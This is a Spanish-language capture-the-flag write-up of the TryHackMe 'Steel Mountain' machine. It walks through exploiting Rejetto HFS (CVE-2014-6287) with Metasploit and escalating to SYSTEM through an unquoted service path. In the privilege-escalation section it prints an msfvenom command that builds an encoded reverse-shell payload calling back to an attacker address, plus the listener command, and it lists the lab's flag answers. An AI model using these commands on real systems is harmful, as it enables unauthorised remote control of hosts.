---
title: Steel Mountain - Rejetto HFS (CVE-2014-6287)
permalink: /writeups/steel-mountain/
excerpt: Explotación de Rejetto HTTP File Server (CVE-2014-6287) en un objetivo Windows y escalada de privilegios a SYSTEM abusando de un servicio con ruta sin comillas mediante PowerUp.
date: 2024-05-07
categories:
- Máquinas
tags:
- windows
- rejetto-hfs
- cve-2014-6287
- metasploit
- powerup
- tryhackme
layout: writeup
techniques:
- Windows
- Rejetto HFS
- CVE-2014-6287
- PrivEsc
platform: TryHackMe
os: Windows
status: Completado
initial_access: Rejetto HFS
---

> **Máquina:** Steel Mountain · **Plataforma:** TryHackMe · **SO:** Windows · **Dificultad:** Media

## 1. Reconocimiento

Tras conectar a la VPN de la plataforma, se lanza un escaneo completo de puertos sobre el objetivo `10.10.69.201`.

![Escaneo de puertos con Nmap](/assets/informes/steel-mountain/p03_01.jpg)

Se identifican, entre otros, los servicios HTTP (80), un segundo servidor web en el 8080, RDP (3389), SMB (445) y WinRM (5985). El portal web principal muestra al "empleado del mes".

![Portal web del objetivo](/assets/informes/steel-mountain/p03_02.jpg)

Inspeccionando la imagen del empleado del mes se obtiene el nombre **Bill Harper**, respuesta a la primera tarea.

![Nombre del empleado del mes](/assets/informes/steel-mountain/p03_03.jpg)

## 2. Análisis de vulnerabilidades

El servidor del puerto 8080 corresponde a **Rejetto HTTP File Server (HFS) 2.3**, vulnerable a **CVE-2014-6287**, que permite ejecución remota de comandos.

![Detección de Rejetto HFS 2.3](/assets/informes/steel-mountain/p04_04.jpg)

Resumen del objetivo:

| Campo | Valor |
|---|---|
| IP | 10.10.69.201 |
| Sistema Operativo | Windows |
| Servicio vulnerable | Rejetto HFS 2.3 (puerto 8080) |
| CVE | 2014-6287 |

![Resumen de la vulnerabilidad](/assets/informes/steel-mountain/p04_05.jpg)

## 3. Explotación

Se emplea el módulo `exploit/windows/http/rejetto_hfs_exec`, configurando `LHOST`, `RHOSTS` y `RPORT` (8080).

![Módulo rejetto_hfs_exec en Metasploit](/assets/informes/steel-mountain/p06_06.jpg)

![Configuración y ejecución del exploit](/assets/informes/steel-mountain/p06_07.jpg)

La explotación devuelve una sesión de Meterpreter como el usuario `steelmountain\bill`, sin privilegios administrativos.

![Sesión obtenida como usuario bill](/assets/informes/steel-mountain/p06_08.jpg)

![Shell interactiva del usuario bill](/assets/informes/steel-mountain/p07_09.jpg)

## 4. Escalada de privilegios

Se transfiere el script **PowerUp.ps1** a la máquina a través de la sesión de Meterpreter.

![Transferencia de PowerUp.ps1](/assets/informes/steel-mountain/p07_10.jpg)

Cargando el módulo de PowerShell y ejecutando `Invoke-AllChecks`, se identifica el servicio **AdvancedSystemCareService9** con una ruta de ejecutable **sin comillas** (unquoted service path) y permisos de escritura.

![Resultado de Invoke-AllChecks](/assets/informes/steel-mountain/p08_11.jpg)

![Servicio vulnerable identificado](/assets/informes/steel-mountain/p08_12.jpg)

Se genera un payload con msfvenom nombrado para aprovechar la ruta sin comillas, y se prepara un handler:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.46.99 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe

msfconsole -qx 'use exploit/multi/handler; set lhost tun0; set lport 4443; set payload windows/meterpreter/reverse_tcp; run'
```

![Creación del payload](/assets/informes/steel-mountain/p08_13.jpg)

Se sube el ejecutable y se reinicia el servicio, que se ejecuta como `NT AUTHORITY\SYSTEM`, otorgando una nueva sesión con privilegios máximos.

![Carga del payload y reinicio del servicio](/assets/informes/steel-mountain/p09_14.jpg)

## 5. Banderas

Con acceso como SYSTEM se extraen las banderas de usuario y de root.

![Extracción de banderas](/assets/informes/steel-mountain/p10_15.jpg)

| Usuario | Archivo | Bandera |
|---|---|---|
| bill | bandera1.txt | b04763b6fcf51fcd7c13abc7db4fd365 |
| root | bandera2.txt | 9af5f314f57607c00fd09803a587db80 |

## 6. Herramientas utilizadas

Kali Linux, Nmap, OpenVAS, Metasploit Framework, msfvenom, PowerUp.ps1 y Exploit-DB.

## 7. Recomendaciones de mitigación

Actualizar Rejetto HFS a una versión no vulnerable, encerrar entre comillas las rutas de los servicios de Windows, revisar los permisos de escritura sobre ejecutables de servicios y restringir la exposición de servidores web secundarios.
